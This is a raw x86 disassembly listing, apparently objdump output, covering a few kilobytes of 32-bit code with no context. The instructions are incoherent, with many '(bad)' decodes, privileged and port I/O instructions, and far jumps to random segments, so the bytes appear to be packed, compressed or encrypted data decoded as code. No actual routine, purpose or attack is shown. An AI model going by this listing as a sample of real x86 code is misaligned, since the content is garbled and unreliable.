  4101d8:	or     ebp,DWORD PTR es:[ecx-0x6f]
  4101dc:	shl    BYTE PTR [edx+0x7de50423],cl
  4101e2:	and    ebx,DWORD PTR [edi]
  4101e4:	stc    
  4101e5:	icebp  
  4101e6:	std    
  4101e7:	adc    BYTE PTR [ebx+0x7a999544],0xe5
  4101ee:	push   0x7c
  4101f0:	pop    ecx
  4101f1:	mov    edi,0x950d132
  4101f6:	or     BYTE PTR [ecx+0xd8dada5],bh
  4101fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4101fd:	mov    bl,0x1f
  4101ff:	scas   al,BYTE PTR es:[edi]
  410200:	or     DWORD PTR [eax-0x79a83d65],eax
  410206:	mov    ds:0x80f4ac00,al
  41020b:	pop    edx
  41020c:	or     ebp,DWORD PTR [eax]
  41020e:	xchg   edx,eax
  41020f:	or     bl,dh
  410211:	xchg   ah,bl
  410213:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410214:	f2xm1  
  410216:	mov    dl,0xc9
  410218:	dec    eax
  410219:	sar    DWORD PTR [edx-0x5e96da7d],1
  41021f:	inc    DWORD PTR [ecx]
  410221:	test   BYTE PTR [ecx-0x6fe220ca],0x43
  410228:	xor    DWORD PTR [ebp-0x62b1a7f8],esp
  41022e:	lock push ebp
  410230:	and    ecx,ecx
  410232:	es xchg ebp,eax
  410234:	nop
  410235:	sahf   
  410236:	jns    0x410240
  410238:	neg    BYTE PTR [ebx+0x25e7b157]
  41023e:	ret    0xdfec
  410241:	jno    0x41022d
  410243:	cmc    
  410244:	loop   0x4102ab
  410246:	hlt    
  410247:	ds pop es
  410249:	mov    bl,0x27
  41024b:	shr    BYTE PTR [esi+0x66],cl
  41024e:	jmp    0x7726:0x685d3e4f
  410255:	jne    0x4102be
  410257:	iret   
  410258:	(bad)
  41025b:	cdq    
  41025c:	lods   al,BYTE PTR ds:[esi]
  41025d:	leave  
  41025e:	pop    ecx
  41025f:	cmc    
  410260:	cmp    eax,0x3d814fe3
  410265:	dec    esp
  410266:	pop    edi
  410267:	stos   BYTE PTR es:[edi],al
  410268:	fwait
  410269:	shr    DWORD PTR [esi+0x2081a6da],cl
  41026f:	cmp    edx,DWORD PTR [esi-0x4d8394a6]
  410275:	(bad)  
  410276:	fucomp st(1)
  410278:	in     eax,0xec
  41027a:	push   edi
  41027b:	ror    DWORD PTR [esi+ebp*4+0x52cdbde9],cl
  410282:	jl     0x4102f7
  410284:	sbb    edi,ebp
  410286:	popa   
  410287:	addr16 cwde 
  410289:	adc    DWORD PTR [edi-0x70981cea],ecx
  41028f:	push   0x5c
  410291:	in     al,dx
  410292:	or     eax,0xd08e9da3
  410297:	cmp    al,0x30
  410299:	bound  ebx,QWORD PTR [eax-0x1b]
  41029c:	add    DWORD PTR [esp+ecx*8-0x21ec8f9],ecx
  4102a3:	add    BYTE PTR [edi+eax*4+0x62b8b908],al
  4102aa:	inc    edi
  4102ab:	jnp    0x410257
  4102ad:	outs   dx,BYTE PTR ds:[esi]
  4102ae:	mov    ds:0x8f409bac,al
  4102b3:	or     edx,DWORD PTR [edx+0x2d]
  4102b6:	pop    edi
  4102b7:	(bad)  
  4102b8:	xchg   ebp,eax
  4102b9:	mov    ds:0xed004889,al
  4102bf:	cmp    DWORD PTR [ebx+0x48942dfd],edi
  4102c5:	loop   0x41025c
  4102c7:	adc    DWORD PTR [esi-0x59],0xffffffe1
  4102cb:	mov    esp,0x96a57730
  4102d0:	mov    BYTE PTR [edx-0x6ad08308],0x4a
  4102d7:	xor    DWORD PTR [edx+0x1f71b617],0xeb96909e
  4102e1:	movaps xmm2,XMMWORD PTR [edi-0x161b68be]
  4102e8:	call   0x8d849582
  4102ed:	ins    BYTE PTR es:[edi],dx
  4102ee:	int    0x37
  4102f0:	xor    al,0x8e
  4102f2:	(bad)  
  4102f3:	pop    edx
  4102f4:	jmp    0xbff0bfc
  4102f9:	xchg   esp,eax
  4102fa:	add    BYTE PTR [edx-0x63d0c5cb],cl
  410300:	add    al,0xdf
  410302:	or     eax,0xe66dc4b6
  410307:	inc    ecx
  410308:	nop
  410309:	inc    ebp
  41030a:	cmp    bl,BYTE PTR [ebx]
  41030c:	xor    DWORD PTR [ebx+0x51d2d4f],ecx
  410312:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410313:	jecxz  0x410314
  410315:	imul   ebp,DWORD PTR [esi-0x3a],0xffffffe1
  410319:	int3   
  41031a:	dec    edi
  41031b:	fs dec ebx
  41031d:	mov    cs,WORD PTR [esi-0x30852fcc]
  410323:	dec    ebx
  410324:	mov    ds,WORD PTR [edi]
  410326:	hlt    
  410327:	inc    ebp
  410328:	dec    esp
  410329:	(bad)  
  41032a:	std    
  41032b:	xchg   BYTE PTR [ecx-0x9],bh
  41032e:	outs   dx,BYTE PTR ds:[esi]
  41032f:	shr    BYTE PTR [edx],1
  410331:	push   esi
  410332:	scas   al,BYTE PTR es:[edi]
  410333:	pop    ecx
  410334:	sub    bh,0xef
  410337:	retf   
  410338:	mov    bl,0xf3
  41033a:	xchg   ebp,eax
  41033b:	int    0x8a
  41033d:	mov    eax,0xd27960ab
  410342:	sahf   
  410343:	jno    0x41032d
  410345:	mov    ebx,0xdfde011
  41034a:	adc    DWORD PTR ds:0x1632886b,esp
  410350:	test   DWORD PTR [eax],esp
  410352:	sar    DWORD PTR [esp+eax*1+0x5b],0x45
  410357:	sbb    DWORD PTR [edi+ebx*2+0x2430f278],edx
  41035e:	and    al,0x54
  410360:	sbb    BYTE PTR [eax],al
  410362:	push   0x26
  410364:	push   ss
  410365:	mov    bl,0xff
  410367:	pop    ss
  410368:	inc    eax
  410369:	loop   0x410301
  41036b:	fwait
  41036c:	not    edx
  41036e:	leave  
  41036f:	push   ds
  410370:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410371:	bnd ja 0x4103ca
  410374:	and    esp,ecx
  410376:	or     DWORD PTR [edi-0x5072237a],ebx
  41037c:	xor    esi,esp
  41037e:	push   edx
  41037f:	xchg   edx,eax
  410380:	inc    edx
  410381:	mov    bl,0xdc
  410383:	mov    WORD PTR [eax-0x34ab078c],?
  410389:	and    dl,BYTE PTR [edi-0x62]
  41038c:	pushf  
  41038d:	mov    WORD PTR [edx+0x53],fs
  410390:	mul    ecx
  410392:	pop    es
  410393:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410394:	ret    0x3d00
  410397:	mov    ebp,0x7a3cb145
  41039c:	inc    edi
  41039d:	dec    esi
  41039e:	ror    BYTE PTR [edi],1
  4103a0:	xchg   esi,eax
  4103a1:	jecxz  0x410345
  4103a3:	loope  0x41032a
  4103a5:	loopne 0x410424
  4103a7:	leave  
  4103a8:	mov    ebp,0x3e35d784
  4103ad:	into   
  4103ae:	aaa    
  4103af:	pop    edx
  4103b0:	ret    0x7c1e
  4103b3:	imul   ebx,edx,0xffffff96
  4103b6:	ins    DWORD PTR es:[edi],dx
  4103b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4103b8:	push   esi
  4103b9:	inc    edx
  4103ba:	adc    ebp,DWORD PTR [edx-0x52c556f]
  4103c0:	jnp    0x4103a4
  4103c2:	jmp    0x10f6:0xc20803cb
  4103c9:	xor    edx,DWORD PTR [edx-0x3de16cfc]
  4103cf:	jno    0x410416
  4103d1:	je     0x41035b
  4103d3:	(bad)  
  4103d4:	in     eax,dx
  4103d5:	sub    bh,ch
  4103d7:	or     eax,DWORD PTR [edx]
  4103d9:	jno    0x4103bf
  4103db:	loop   0x410413
  4103dd:	dec    edx
  4103de:	fsubrp st(2),st
  4103e0:	(bad)  
  4103e1:	aaa    
  4103e2:	cmp    al,0x63
  4103e4:	dec    ecx
  4103e5:	mov    al,ds:0x25eece01
  4103ea:	mov    bh,0x29
  4103ec:	adc    DWORD PTR [ebx-0x663f6f39],ebp
  4103f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4103f3:	js     0x410428
  4103f5:	stc    
  4103f6:	rcr    BYTE PTR [ebx-0x1719368b],1
  4103fc:	(bad)  
  4103fd:	nop
  4103fe:	mov    ch,0x1a
  410400:	sub    DWORD PTR [esi+esi*2-0x17],ecx
  410404:	repnz mov bl,0x34
  410407:	loop   0x41046a
  410409:	jg     0x4103c6
  41040b:	cmc    
  41040c:	jecxz  0x41040a
  41040e:	xor    al,BYTE PTR [ebx]
  410410:	xchg   ebp,eax
  410411:	ins    BYTE PTR es:[edi],dx
  410412:	cmp    BYTE PTR [esi+0x56],bl
  410415:	pop    esi
  410416:	or     eax,0xb6540ba7
  41041b:	push   ds
  41041c:	push   edx
  41041d:	imul   ecx,eax,0xffffffb0
  410420:	dec    edx
  410421:	call   0x59660500
  410426:	adc    edi,DWORD PTR [eax-0x615a5aa8]
  41042c:	lods   eax,DWORD PTR ds:[esi]
  41042d:	push   ecx
  41042e:	js     0x410446
  410430:	adc    al,0x90
  410432:	mov    fs,WORD PTR [ecx]
  410434:	inc    ecx
  410435:	mov    WORD PTR [ebx+ebx*1],gs
  410438:	fst    st(6)
  41043a:	cmp    DWORD PTR [edx+ebp*1-0x157c8693],esp
  410441:	cmp    ebx,DWORD PTR [eax+ebp*4-0x1a]
  410445:	stc    
  410446:	popf   
  410447:	xchg   ebp,eax
  410448:	xchg   ebx,eax
  410449:	pop    es
  41044a:	cmp    DWORD PTR [esi+ebp*2-0x253915ac],eax
  410451:	pop    edi
  410452:	js     0x410440
  410454:	jae    0x4103fe
  410456:	in     eax,dx
  410457:	sbb    BYTE PTR [edx+0x4d],ch
  41045a:	push   eax
  41045b:	cwde   
  41045c:	dec    ebp
  41045d:	outs   dx,BYTE PTR es:[esi]
  41045f:	test   eax,0x344f1333
  410464:	stos   DWORD PTR es:[edi],eax
  410465:	into   
  410466:	into   
  410467:	dec    ebp
  410468:	push   es
  410469:	mov    ah,0x5d
  41046b:	imul   edx,DWORD PTR [edi+0x2],0x7f55f1c4
  410472:	cs stos BYTE PTR es:[edi],al
  410474:	mov    ebp,ecx
  410476:	mov    al,0xe
  410478:	ret    0x41ae
  41047b:	xor    eax,0xeca940d7
  410480:	inc    edx
  410481:	fldl2t 
  410483:	mov    bh,cl
  410485:	and    eax,DWORD PTR cs:[ebx+0x66c69453]
  41048c:	in     al,0x73
  41048e:	cmp    edi,0x31f4e500
  410494:	mov    ds:0x9c35857e,eax
  410499:	aam    0x28
  41049b:	(bad)  
  41049c:	sbb    ebx,edx
  41049e:	cmp    ah,ah
  4104a0:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  4104a2:	pop    es
  4104a3:	addr16 push 0xffffffc6
  4104a6:	add    bl,BYTE PTR [edx+0x6f197880]
  4104ac:	in     al,dx
  4104ad:	mov    ch,0x71
  4104af:	aad    0x53
  4104b1:	leave  
  4104b2:	fild   WORD PTR [esi+0x31fe43de]
  4104b8:	xor    al,0xcd
  4104ba:	mov    edi,0x5a6349e8
  4104bf:	into   
  4104c0:	in     al,dx
  4104c1:	adc    cl,al
  4104c3:	ins    BYTE PTR es:[edi],dx
  4104c4:	jmp    0x5130e6fc
  4104c9:	xchg   edi,eax
  4104ca:	sub    eax,DWORD PTR [edi+0x2f]
  4104cd:	clc    
  4104ce:	inc    ecx
  4104cf:	mov    BYTE PTR [ecx+ecx*2],cl
  4104d2:	and    eax,esp
  4104d4:	xchg   esp,eax
  4104d5:	jp     0x410463
  4104d7:	clc    
  4104d8:	loopne 0x41049c
  4104da:	jp     0x410536
  4104dc:	push   esp
  4104dd:	adc    DWORD PTR [ecx-0x6c],esi
  4104e0:	sbb    cl,al
  4104e2:	or     edx,DWORD PTR [edx]
  4104e4:	adc    DWORD PTR [eax+0x23994fb9],eax
  4104ea:	lock xor DWORD PTR [esp+eax*4+0x608713ff],edi
  4104f2:	ret    0x35b7
  4104f5:	fsub   QWORD PTR [esi+eax*8]
  4104f8:	sbb    ecx,esp
  4104fa:	ja     0x4104e0
  4104fc:	outs   dx,BYTE PTR ds:[esi]
  4104fd:	pop    ebp
  4104fe:	cli    
  4104ff:	mov    DWORD PTR [esi+0x5e],edx
  410502:	out    dx,eax
  410503:	jp     0x410546
  410505:	js     0x410571
  410507:	cmp    edi,DWORD PTR [edx-0x38]
  41050a:	lds    ebx,FWORD PTR [ecx+0x645e1764]
  410510:	adc    ecx,esp
  410512:	iret   
  410513:	cmc    
  410514:	mov    ch,0x3d
  410516:	mov    eax,0xc5d0a72f
  41051b:	lds    esi,FWORD PTR [edx-0x40ae4af6]
  410521:	out    dx,eax
  410522:	adc    al,0x9
  410524:	sbb    edi,esi
  410526:	mov    al,ds:0x31c27e1d
  41052b:	xor    BYTE PTR [ebx+0x8],dh
  41052e:	xchg   esp,eax
  41052f:	into   
  410530:	mov    ebp,0x58c2abd5
  410535:	mov    ah,0xca
  410537:	hlt    
  410538:	mov    al,0xff
  41053a:	mov    al,ds:0x77dd0f17
  41053f:	and    eax,ecx
  410541:	mov    ecx,0x21dd3b38
  410546:	les    edx,FWORD PTR [ecx]
  410548:	and    ah,bh
  41054a:	out    0xef,eax
  41054c:	sbb    al,0x15
  41054e:	jge    0x4105be
  410550:	btr    edx,esi
  410553:	data16 fwait
  410555:	mul    DWORD PTR [ebp+edx*2+0x22b4e010]
  41055c:	xchg   edi,eax
  41055d:	mov    DWORD PTR [edx-0x7278aad4],eax
  410563:	fucomip st,st(2)
  410565:	push   0x8809ac1b
  41056a:	inc    esi
  41056b:	scas   eax,DWORD PTR es:[edi]
  41056c:	xlat   BYTE PTR ds:[ebx]
  41056d:	ja     0x410544
  41056f:	outs   dx,DWORD PTR ds:[esi]
  410570:	addr16 mov edx,0x83deda2
  410576:	inc    esi
  410577:	call   0x820f8090
  41057c:	cmc    
  41057d:	push   es
  41057e:	(bad)  
  41057f:	(bad)  
  410581:	fistp  DWORD PTR [ebp-0x4af6cc6]
  410587:	cmc    
  410588:	mov    bl,0x40
  41058a:	int3   
  41058b:	push   esi
  41058c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41058d:	xchg   ebp,ebp
  41058f:	adc    edx,DWORD PTR [ecx]
  410591:	outs   dx,DWORD PTR ds:[esi]
  410592:	(bad)  
  410593:	aaa    
  410594:	and    al,0x25
  410596:	jb     0x4105be
  410598:	rcr    BYTE PTR [ebx+0x2e],cl
  41059b:	or     BYTE PTR [ecx-0x26b4f699],al
  4105a1:	(bad)  
  4105a2:	aam    0xc0
  4105a4:	inc    edx
  4105a5:	mov    eax,ds:0x6af5161d
  4105aa:	pop    edi
  4105ab:	(bad)  
  4105ac:	pop    ss
  4105ad:	jns    0x4105aa
  4105af:	lds    ecx,FWORD PTR [eax+0x676923ee]
  4105b5:	out    0x7a,al
  4105b7:	pop    edi
  4105b8:	xchg   BYTE PTR [ecx+0x70],dh
  4105bb:	adc    dl,al
  4105bd:	call   0x28d:0x13f44b03
  4105c4:	std    
  4105c5:	add    DWORD PTR [edi-0x23c1d949],ecx
  4105cb:	push   edx
  4105cc:	(bad)  
  4105cd:	mov    eax,0xe2a4eb44
  4105d2:	sub    ah,BYTE PTR [eax]
  4105d4:	scas   al,BYTE PTR es:[edi]
  4105d5:	add    cl,BYTE PTR [eax+eax*8-0x80]
  4105d9:	sbb    dh,bl
  4105db:	arpl   dx,si
  4105dd:	popa   
  4105de:	push   ss
  4105df:	dec    ebp
  4105e0:	cmp    ah,BYTE PTR [edi+0x4f]
  4105e3:	jle    0x410643
  4105e5:	sbb    eax,ebx
  4105e7:	cwde   
  4105e8:	xor    cl,BYTE PTR [esi+0x11dcbf4a]
  4105ee:	pop    ds
  4105ef:	jbe    0x410623
  4105f1:	lea    esp,[ecx+0x3887a7e1]
  4105f7:	mov    edi,0x9258871
  4105fc:	ret    0x4695
  4105ff:	xorps  xmm6,XMMWORD PTR [ebx+edi*4-0x7e]
  410604:	js     0x41059d
  410606:	and    DWORD PTR [esi+edi*1],ebx
  410609:	popf   
  41060a:	mov    ecx,0x550365fc
  41060f:	cmp    DWORD PTR [eax],ecx
  410611:	fisubr WORD PTR [esi-0x7b]
  410614:	inc    esi
  410615:	sub    DWORD PTR [ecx+0x7f],0xc3aa87e8
  41061c:	shl    BYTE PTR [edx-0x17],1
  41061f:	(bad)  
  410620:	pop    ebx
  410621:	ins    DWORD PTR es:[edi],dx
  410622:	xlat   BYTE PTR ds:[ebx]
  410623:	es xchg esi,eax
  410625:	push   esp
  410626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410627:	cli    
  410628:	mov    esi,0x3c51c802
  41062d:	dec    ax
  41062f:	fld    QWORD PTR [esi]
  410631:	fst    DWORD PTR [edi+0xe]
  410634:	ss mov bh,0xbd
  410637:	sbb    BYTE PTR [eax-0x2a],bl
  41063a:	jge    0x410630
  41063c:	or     al,0xcb
  41063e:	dec    esi
  41063f:	sub    ebx,DWORD PTR [edi+0x2d194374]
  410645:	mov    al,ds:0x2daa1596
  41064a:	fldcw  WORD PTR [ecx-0x50]
  41064d:	mov    ds:0xf48cfe53,al
  410652:	mov    cl,BYTE PTR [edx-0x3be3f2]
  410658:	jg     0x4105ed
  41065a:	call   0x5ce5:0xb421436d
  410661:	pop    es
  410662:	pop    edi
  410663:	sbb    eax,DWORD PTR [edi]
  410665:	(bad)  [edi+0x35]
  410668:	cwde   
  410669:	xchg   esp,eax
  41066a:	xor    al,0x3d
  41066c:	jae    0x410606
  41066e:	ss push ebx
  410670:	push   eax
  410671:	(bad)  
  410672:	out    dx,eax
  410673:	xor    BYTE PTR ds:0x17540d91,0x4c
  41067a:	scas   eax,DWORD PTR es:[edi]
  41067b:	sahf   
  41067c:	jecxz  0x410616
  41067e:	mov    cl,0x54
  410680:	jb     0x4106dc
  410682:	cwde   
  410683:	popa   
  410684:	mov    dl,0xb7
  410686:	repz mov ah,BYTE PTR [eax]
  410689:	fs mov db7,esi
  41068d:	add    ebp,DWORD PTR [ebx+ecx*2-0x74]
  410691:	hlt    
  410692:	js     0x4106bd
  410694:	repnz aaa 
  410696:	call   0xe450:0x6aed7b73
  41069d:	sbb    ebx,DWORD PTR [eax+0x5659fc4f]
  4106a3:	pop    eax
  4106a4:	cmp    al,0x6e
  4106a6:	mov    cl,0xdb
  4106a8:	xchg   ebp,eax
  4106a9:	mov    ds:0xfc7d6099,eax
  4106ae:	adc    ebx,DWORD PTR fs:[edi-0x6b]
  4106b2:	out    0xca,al
  4106b4:	in     eax,dx
  4106b5:	inc    ebx
  4106b6:	mov    ds:0x7b04662e,al
  4106bb:	ror    ebp,0xee
  4106be:	loopne 0x4106d0
  4106c0:	fdivp  st(0),st
  4106c2:	cmp    eax,eax
  4106c4:	fdivr  st(6),st
  4106c6:	xchg   ecx,eax
  4106c7:	cmc    
  4106c8:	call   0xe6da:0xc0005cf6
  4106cf:	daa    
  4106d0:	adc    al,0x17
  4106d2:	mov    cl,0x83
  4106d4:	mov    BYTE PTR cs:[ecx+0x6e],ch
  4106d8:	add    ebp,DWORD PTR [edi]
  4106da:	pop    ebx
  4106db:	bound  edi,QWORD PTR [ecx+0x534669dc]
  4106e1:	ds shl bh,cl
  4106e4:	jae    0x41066e
  4106e6:	mov    al,ds:0xfae4f3d8
  4106eb:	and    DWORD PTR [esi+esi*8-0xac8fbf2],esi
  4106f2:	dec    esi
  4106f3:	into   
  4106f4:	cmp    al,0x2b
  4106f6:	mov    edx,0x25eaa030
  4106fb:	push   cs
  4106fc:	or     bh,BYTE PTR [ebp+edi*4+0x67ade87b]
  410703:	shl    edx,1
  410705:	out    0xe1,al
  410707:	xchg   esp,eax
  410708:	jl     0x410769
  41070a:	int    0x1e
  41070c:	paddusb mm2,QWORD PTR [ebp-0x7f]
  410710:	aaa    
  410711:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410712:	fcom   QWORD PTR [edx+0x7d60a5f3]
  410718:	jp     0x410758
  41071a:	in     eax,0xf7
  41071c:	repz pop edi
  41071e:	(bad)  
  410720:	or     dh,al
  410722:	push   es
  410723:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410724:	je     0x4106c9
  410726:	mov    esi,esi
  410728:	adc    DWORD PTR [edi+0x22],esp
  41072b:	pop    ecx
  41072c:	push   esp
  41072d:	dec    ecx
  41072e:	pop    edi
  41072f:	dec    esi
  410730:	gs call 0x522:0xeae51dad
  410738:	gs mov esi,0x69271452
  41073e:	mov    dh,0x17
  410740:	imul   esp,eax,0xe
  410743:	fucompp 
  410745:	(bad)  
  410747:	lock ror DWORD PTR [eax],0x83
  41074b:	mov    esi,0xe67dc62a
  410750:	add    DWORD PTR [esi+edx*8],edx
  410753:	dec    eax
  410754:	repnz fldz 
  410757:	in     al,dx
  410758:	xchg   esi,eax
  410759:	add    ecx,DWORD PTR [esp+ebp*4]
  41075c:	jg     0x4107ce
  41075e:	jbe    0x410769
  410760:	mov    edx,DWORD PTR ds:0x36e33464
  410766:	jg     0x4107a8
  410768:	cwde   
  410769:	mov    bh,0x5f
  41076b:	pop    ebx
  41076c:	or     ebx,DWORD PTR es:[ebx]
  41076f:	push   edx
  410770:	(bad)  
  410771:	mov    bh,0xfc
  410773:	leave  
  410774:	repz adc dl,BYTE PTR [ebx-0x5f83b32b]
  41077b:	xlat   BYTE PTR ds:[ebx]
  41077c:	inc    edx
  41077d:	popa   
  41077e:	daa    
  41077f:	lods   eax,DWORD PTR ds:[esi]
  410780:	mov    ecx,0xb5140d80
  410785:	sub    dh,BYTE PTR [edx+ebx*8]
  410788:	in     al,dx
  410789:	mov    gs,WORD PTR [esi-0x35e49e87]
  41078f:	sbb    eax,0xdaf33a54
  410794:	push   cs
  410795:	ds mov ah,0x2f
  410798:	call   0xf1ec:0x82ebe271
  41079f:	nop
  4107a0:	mov    WORD PTR [ecx+edx*2],fs
  4107a3:	hlt    
  4107a4:	lods   al,BYTE PTR ds:[esi]
  4107a5:	shl    BYTE PTR [ebp-0x25],cl
  4107a8:	or     ch,BYTE PTR [ebp-0x1c]
  4107ab:	data16 add bl,al
  4107ae:	addr16 icebp 
  4107b0:	jb     0x41077b
  4107b2:	dec    ebx
  4107b3:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107b5:	fcmovnb st,st(0)
  4107b7:	ins    DWORD PTR es:[edi],dx
  4107b8:	cmc    
  4107b9:	xchg   ebx,eax
  4107ba:	les    esi,FWORD PTR [ebp+0x4c]
  4107bd:	mov    al,0x7a
  4107bf:	es mov dl,0xea
  4107c2:	dec    eax
  4107c3:	fcomp  DWORD PTR ds:0x2cf076f
  4107c9:	jnp    0x41074b
  4107cb:	add    al,0xfc
  4107cd:	repz enter 0xbd12,0xbf
  4107d2:	mov    al,ds:0x242feb03
  4107d7:	add    al,0x88
  4107d9:	add    bl,ch
  4107db:	cmp    bh,BYTE PTR [ebp+0x2]
  4107de:	mov    cs,WORD PTR ds:[edi-0xa50de85]
  4107e5:	pop    es
  4107e6:	mov    fs,WORD PTR [eax+0x3806b2ac]
  4107ec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4107ed:	lods   al,BYTE PTR ds:[esi]
  4107ee:	arpl   WORD PTR [edi+eiz*8-0x3aa09fe4],bx
  4107f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4107f6:	stc    
  4107f7:	sub    ch,BYTE PTR [ebp-0x59959368]
  4107fd:	add    BYTE PTR [eax-0x5fb8fcf4],dl
  410803:	bound  eax,QWORD PTR [ebp+0x4e9b1e8b]
  410809:	fadd   QWORD PTR [esp+ecx*2-0x1b5931b9]
  410810:	daa    
  410811:	xor    al,0x93
  410813:	shl    BYTE PTR [ecx],0xea
  410816:	rcr    ebx,cl
  410818:	(bad)  
  410819:	enter  0x919a,0x4a
  41081d:	aad    0x1f
  41081f:	cs sysexit 
  410822:	hlt    
  410823:	jge    0x4108a3
  410825:	xchg   esp,eax
  410826:	bound  esp,QWORD PTR [edx]
  410828:	sub    eax,0xab66f504
  41082d:	dec    esp
  41082e:	into   
  41082f:	xchg   DWORD PTR [ecx-0x67],ebp
  410832:	sub    DWORD PTR [edi],0x4f
  410835:	in     al,dx
  410836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410837:	add    al,dl
  410839:	repz xor DWORD PTR [eax],edx
  41083c:	lahf   
  41083d:	cmc    
  41083e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41083f:	stos   DWORD PTR es:[edi],eax
  410840:	test   al,0xe2
  410842:	or     dl,BYTE PTR [ebx-0x75b07d9c]
  410848:	lock pop esp
  41084a:	int3   
  41084b:	mov    DWORD PTR es:[esi+0x7b4b3463],esi
  410852:	dec    edx
  410853:	cwde   
  410854:	xor    al,0xd5
  410856:	sbb    BYTE PTR ds:[edi+eax*2-0x30],dl
  41085b:	rcl    BYTE PTR [eax],cl
  41085d:	inc    edx
  41085e:	inc    esp
  41085f:	pop    esp
  410860:	(bad)  
  410862:	mov    bl,0xc7
  410864:	xchg   ecx,eax
  410865:	shl    ch,1
  410867:	xor    bh,ch
  410869:	mov    ecx,0x6d546738
  41086e:	outs   dx,BYTE PTR ds:[esi]
  41086f:	sbb    eax,0x174f08b9
  410874:	loop   0x4108f4
  410876:	mov    ecx,0x5c23ac7f
  41087b:	or     al,BYTE PTR [edx]
  41087d:	and    al,0x6a
  41087f:	adc    al,0xc7
  410881:	out    0x8e,al
  410883:	push   ss
  410884:	jno    0x410837
  410886:	inc    edx
  410887:	fld    st(0)
  410889:	add    DWORD PTR [ebp-0x24],esi
  41088c:	fimul  DWORD PTR [ebx-0x2ace4dde]
  410892:	push   esi
  410893:	test   DWORD PTR [ecx+0x48],0xf97c9722
  41089a:	jmp    0x2eac:0x2c84754a
  4108a1:	adc    BYTE PTR [ecx+eax*8],bl
  4108a4:	adc    BYTE PTR [edi-0x3a],cl
  4108a7:	mov    eax,0xde78d044
  4108ac:	outs   dx,BYTE PTR ds:[esi]
  4108ad:	into   
  4108ae:	pushf  
  4108af:	out    dx,al
  4108b0:	jg     0x410841
  4108b2:	jns    0x410933
  4108b4:	fisubr WORD PTR ds:0x243e0ff8
  4108ba:	xor    DWORD PTR [ebx+edx*2+0x74],0xffffff8e
  4108bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4108c0:	retf   
  4108c1:	or     eax,DWORD PTR [esi-0x28]
  4108c4:	cmp    eax,0x2ae79b37
  4108c9:	popa   
  4108ca:	stos   DWORD PTR es:[edi],eax
  4108cb:	nop
  4108cc:	or     al,0x67
  4108ce:	fld    DWORD PTR [edx]
  4108d0:	aaa    
  4108d1:	test   DWORD PTR [esi+eiz*4],0xac7c26da
  4108d8:	sbb    BYTE PTR ds:0x65d7ce91,bl
  4108de:	pop    esp
  4108df:	jno    0x41091e
  4108e1:	add    BYTE PTR [esi+0x5ff64a4],ah
  4108e7:	jb     0x4108a9
  4108e9:	out    dx,eax
  4108ea:	mov    ch,0x92
  4108ec:	sar    DWORD PTR [ebx+0x34b3176d],0x6
  4108f3:	imul   ecx,DWORD PTR [esi+0x5cd55104],0x7be767f5
  4108fd:	jns    0x41091c
  4108ff:	sub    eax,0x1a59cb9d
  410904:	push   ecx
  410905:	ss mov ebx,0xceb19b5
  41090b:	imul   eax,DWORD PTR [ecx+ebx*2-0x631eaf23],0x307045fb
  410916:	push   edi
  410917:	test   DWORD PTR [edx+ebp*2],esp
  41091a:	sbb    ebx,DWORD PTR [esi*8-0x8935ec2]
  410921:	shr    ebx,0x60
  410924:	mov    WORD PTR [ebx+esi*8-0x58],gs
  410928:	sbb    bh,bl
  41092a:	stos   DWORD PTR es:[edi],eax
  41092b:	pop    edi
  41092c:	inc    ecx
  41092d:	push   ecx
  41092e:	scas   al,BYTE PTR es:[edi]
  41092f:	mov    edi,0x716259a9
  410934:	retf   
  410935:	dec    ebp
  410936:	xchg   ebx,eax
  410937:	aas    
  410938:	daa    
  410939:	jmp    0x6e36:0x69dcdafc
  410940:	enter  0x24a,0x86
  410944:	fs enter 0x8632,0x4b
  410949:	inc    esp
  41094a:	mov    BYTE PTR [ecx-0x2fbd590d],bl
  410950:	mov    ebx,ss
  410952:	sbb    DWORD PTR [esi],ecx
  410954:	repz inc dx
  410957:	ficom  DWORD PTR [esi]
  410959:	pop    edi
  41095a:	sar    BYTE PTR [esi+0x22],cl
  41095d:	sbb    BYTE PTR [edi+0x1285a217],dh
  410963:	ja     0x410926
  410965:	add    cl,bl
  410967:	sti    
  410968:	outs   dx,BYTE PTR ds:[esi]
  410969:	hlt    
  41096a:	lea    ecx,[ebx-0x4d]
  41096d:	and    esp,DWORD PTR [eax]
  41096f:	mov    eax,0xe269d562
  410974:	mov    ds:0x8ca3f8ef,eax
  410979:	mov    ds:0x2c7e5754,al
  41097e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41097f:	add    BYTE PTR [eax],0xf2
  410982:	scas   al,BYTE PTR es:[edi]
  410983:	jge    0x4109b0
  410985:	adc    dh,dh
  410987:	jae    0x410936
  410989:	dec    ebp
  41098a:	jo     0x41091d
  41098c:	push   0xffffff97
  41098e:	sub    al,0x42
  410990:	out    dx,eax
  410991:	enter  0x2376,0xda
  410995:	out    dx,eax
  410996:	sub    dh,BYTE PTR [esi-0x1b48c0a]
  41099c:	dec    edi
  41099d:	ret    
  41099e:	(bad)  
  41099f:	fiadd  DWORD PTR [edi]
  4109a1:	shl    BYTE PTR [ecx-0x30],cl
  4109a4:	mov    esi,0xe456c576
  4109a9:	inc    ebp
  4109aa:	adc    dh,dh
  4109ac:	(bad)  
  4109ad:	loope  0x410a26
  4109af:	sub    al,0x5b
  4109b1:	fist   WORD PTR [edi+0x10]
  4109b4:	xchg   eax,eax
  4109b6:	call   FWORD PTR ss:[edx+ecx*8]
